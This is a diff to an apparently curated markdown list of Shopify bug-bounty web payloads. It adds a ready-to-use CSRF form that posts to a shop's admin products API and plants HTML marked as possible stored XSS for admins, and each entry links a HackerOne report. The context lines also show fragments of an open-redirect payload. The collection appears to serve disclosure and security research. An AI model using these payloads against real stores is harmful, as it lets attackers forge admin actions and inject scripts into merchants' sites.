@@ -1,6 +1,6 @@
 # Shopify
 
-77 payloads.
+78 payloads.
 
 ### `56e13cfe`
 
@@ -144,6 +144,20 @@ https://<shop>.target.com/admin/bulk?resource_name=Product&return_to=/..//evil.c
 
 **Parameter:** `first_name`
 — [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
+
+### `667875e4`
+
+```
+<form action="https://[shop].target.com/admin/products.json" method=post>
+<input name="product[title]" value="API CSRF TEST">
+<input name="product[vendor]" value="test">
+<input name="product[body_html]" value="<h1>API CSRF TEST [Can be stored XSS for admins]</h1>">
+ <input name="product[product_type]" value="test">
+<input type=submit>
+</form>
+```
+
+— [CSRF in all API endpoints when authenticated using HTTP Authentication](https://hackerone.com/reports/195156) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)
 
 ### `b62ca76b`
 
